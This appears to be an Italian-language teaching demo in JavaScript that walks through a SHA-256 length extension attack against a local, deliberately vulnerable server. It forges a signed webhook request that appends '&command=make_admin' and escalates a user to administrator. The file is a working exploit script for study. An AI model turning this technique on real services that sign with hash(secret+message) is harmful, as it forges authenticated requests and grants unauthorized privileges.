import http from 'http';
import { log, printStep, wait_for_enter, prompt } from "./helpers.js";
import { generateExtendedSignature } from "./attack.js";

const SERVER_URL = "http://127.0.0.1:3000";

async function makeHttpRequest(method, url, data = null, headers = {}) {
  return new Promise((resolve, reject) => {
    const parsedUrl = new URL(url);
    const options = {
      hostname: parsedUrl.hostname,
      port: parsedUrl.port,
      path: parsedUrl.pathname + parsedUrl.search,
      method: method,
      headers: {
        ...headers
      }
    };

    if (data) {
      options.headers['Content-Type'] = 'application/octet-stream';
      options.headers['Content-Length'] = data.length;
    }

    const req = http.request(options, (res) => {
      let responseData = '';
      res.on('data', (chunk) => { responseData += chunk; });
      res.on('end', () => {
        try {
          resolve({ status: res.statusCode, data: JSON.parse(responseData) });
        } catch (e) {
          resolve({ status: res.statusCode, data: responseData });
        }
      });
    });

    req.on('error', (e) => { reject(e); });
    
    if (data) {
      req.write(data);
    }
    req.end();
  });
}

async function performInteractiveAttack() {
  log.title("LUNGHEZZA ATTACCO DI ESTENSIONE");
  
  const USER_ID = 1;
  const ORIGINAL_DATA = `user_id=${USER_ID}&action=view_profile`;
  
  let dataToAppend = await prompt(`Payload da aggiungere (es. '&command=make_admin'): `);
  if (!dataToAppend) {
    log.error("Input mancante. Il payload è obbligatorio per l'attacco.");
    return;
  }
  dataToAppend = Buffer.from(dataToAppend, 'utf-8');

  let keyLengthGuess = await prompt(`Indovina la lunghezza della chiave (es. 23): `);
  if (!keyLengthGuess) {
    log.error("Input mancante. La lunghezza della chiave è obbligatoria per l'attacco.");
    return;
  }
  keyLengthGuess = parseInt(keyLengthGuess, 10);
  log.info(`OK, useremo la lunghezza chiave stimata di ${keyLengthGuess} bytes per il calcolo. Vediamo cosa succede...`);
  await wait_for_enter();

  printStep(1, "Ottenere una firma valida per un messaggio conosciuto");
  log.info(`L'attaccante invia una richiesta legittima al server per ottenere una firma per il messaggio:`);
  console.log(`  ${ORIGINAL_DATA}`);

  let response;
  try {
    const requestUrl = `${SERVER_URL}/profile?id=${USER_ID}&action=view_profile`;
    response = await makeHttpRequest('GET', requestUrl);
    if (response.status !== 200) {
      throw new Error(`Impossibile connettersi al server. (Status: ${response.status})`);
    }
  } catch (error) {
    log.error(`ERRORE: Impossibile connettersi a ${SERVER_URL}.`);
    log.warn("Assicurati che il file 'app.js' sia in esecuzione in un altro terminale (digita 'node app.js').");
    return;
  }

  const originalSignatureHex = response.data.signature;
  log.success(`SUCCESSO! Il server ha risposto con una firma valida:`);
  console.log(`  -> ${originalSignatureHex}`);
  log.info(`Firma ricevuta per: "${response.data.payload}"`);
  await wait_for_enter();

  printStep(2, "Calcolare il 'Padding Colla' (Glue Padding)");
  log.info("L'attaccante non conosce la chiave, ma sa che l'hash originale è stato calcolato su:");
  log.info(`hash( SECRET_KEY + ORIGINAL_DATA + PADDING )`);

  const originalHashedLength = keyLengthGuess + Buffer.from(ORIGINAL_DATA, 'utf-8').length;
  log.info(`Calcoliamo il padding per una lunghezza totale di ${keyLengthGuess} (key) + ${Buffer.from(ORIGINAL_DATA, 'utf-8').length} (data) = ${originalHashedLength} bytes.`);

  await wait_for_enter();

  printStep(3, "Assemblare il Corpo della Richiesta Forgiata");
  log.info("Il corpo che invieremo al server è composto da 3 parti:");
  const forgedSignatureResult = generateExtendedSignature(originalSignatureHex, keyLengthGuess, Buffer.from(ORIGINAL_DATA, 'utf-8'), dataToAppend);
  const { forged_body, forged_signature_hex, glue_padding } = forgedSignatureResult;

  console.log(`  1. Dati Originali: ${ORIGINAL_DATA}`);
  console.log(`  2. Padding Colla : ${glue_padding.toString('hex')}`);
  console.log(`  3. Dati Aggiunti: ${dataToAppend.toString()}`);
  log.info("\nCorpo completo forgiato (lunghezza: " + forged_body.length + " bytes)");
  console.log(`  Hex (primi 200 caratteri): ${forged_body.toString('hex').substring(0, 200)}...`);
  await wait_for_enter();

  printStep(4, "Calcolare la Nuova Firma 'Continuando' l'Hash");
  log.info("Ora usiamo la nostra implementazione di SHA-256 per processare i dati aggiunti,");
  log.info("ma inizializzando l'algoritmo con lo stato dall'hash originale.");
  
  log.success(`FATTO! La nuova firma, valida per il corpo forgiato, è:`);
  console.log(`  -> ${forged_signature_hex}`);
  log.info(`(Lunghezza della firma: ${forged_signature_hex.length} caratteri hex = ${forged_signature_hex.length/2} bytes)`);
  await wait_for_enter();

  printStep(5, "Lanciare l'Attacco!");
  log.info("Inviamo la richiesta POST al webhook con il corpo e la firma che abbiamo appena creato.");
  console.log(`  -> URL    : ${SERVER_URL}/webhook_vulnerable`);
  console.log(`  -> Headers: {'X-Signature': '${forged_signature_hex.trim()}'}`);
  log.info(`  -> Body   : ${forged_body.length} bytes`);
  log.info("\nOsserva il terminale del server per vedere la sua reazione...");
  await wait_for_enter();

  const headers = {'X-Signature': forged_signature_hex.trim()};
  const attackResponse = await makeHttpRequest('POST', `${SERVER_URL}/webhook_vulnerable`, forged_body, headers);

  console.log("\n--- RISULTATO ---");
  log.info(`Il server ha risposto con Status Code: ${attackResponse.status}`);
  log.info(`Corpo della risposta: ${JSON.stringify(attackResponse.data, null, 2)}`);

  if (attackResponse.status === 200 && attackResponse.data.attack_successful) {
    log.critical(">>> ATTACCO RIUSCITO! IL SERVER HA ACCETTATO LA NOSTRA RICHIESTA FORGIATA! <<<<");
    log.critical(`>>> L'utente ${USER_ID} è ora un amministratore! <<<<`);
    log.info("\nEsegui 'node database.debug.js' per vedere lo stato del database aggiornato.");
  } else if (attackResponse.status === 200) {
    log.warn(">>> Il server ha accettato la richiesta ma non ha eseguito il comando make_admin.");
  } else {
    log.error(">>> ATTACCO FALLITO. Il server ha rifiutato la richiesta. <<<<");
    log.warn(`>>> Verifica che la lunghezza della chiave sia corretta (${keyLengthGuess} bytes). <<<<`);
  }
}

performInteractiveAttack();